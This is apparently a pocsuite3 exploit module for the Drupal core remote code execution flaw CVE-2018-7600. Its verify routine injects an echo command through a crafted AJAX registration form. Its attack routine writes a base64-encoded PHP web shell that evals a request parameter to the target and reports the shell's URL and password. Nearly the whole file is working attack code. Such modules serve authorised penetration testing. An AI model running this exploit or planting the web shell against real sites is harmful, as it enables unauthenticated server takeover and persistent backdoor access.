"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import os, base64
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = 'SSVID-97207 CVE-2018-7600'  # ssvid
    version = '1.0'
    author = ['seebug', 'cz']
    vulDate = '2018-03-08'
    createDate = '2018-04-12'
    updateDate = '2018-04-13'
    references = ['https://www.seebug.org/vuldb/ssvid-97207']
    name = 'Drupal core Remote Code Execution'
    appPowerLink = ''
    appName = 'Drupal'
    appVersion = '7-7.57, 8.x-8.3.8, 8.4.x-5, 8.5.0'
    vulType = 'Romote Code Execution'
    desc = '''由于Drupal对Form API（FAPI）的AJAX请求的输入没有进行严格过滤，使得攻击者有机会将恶意荷载注入内部表单结构，从而导致Drupal在没有进行用户认证的情况下执行恶意荷载。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        flag = random_str(length=10)
        url = self.url.rstrip('/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': 'echo "{0}";'.format(flag)
        }

        resp = requests.post(url, data=payload)
        try:
            if '"data":"{0}'.format(flag) in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        filename = random_str(6)+'.php'
        webshell = '''<?php echo 'DEADBEEF';eval($_REQUEST['CzRee']); ?>'''
        url = self.url.rstrip('/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        cmd = '''echo {} | base64 -d | tee {}'''.format(base64.b64encode(webshell.encode()).decode(), filename)
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': cmd
        }

        resp = requests.post(url, data=payload)
        r = requests.get(urljoin(self.url, filename))
        try:
            if 'DEADBEEF' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = urljoin(self.url, filename)
                result['ShellInfo']['Content'] = 'CzRee'
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def _shell(self):
        pass
    
    _check = _verify


register_poc(DemoPOC)
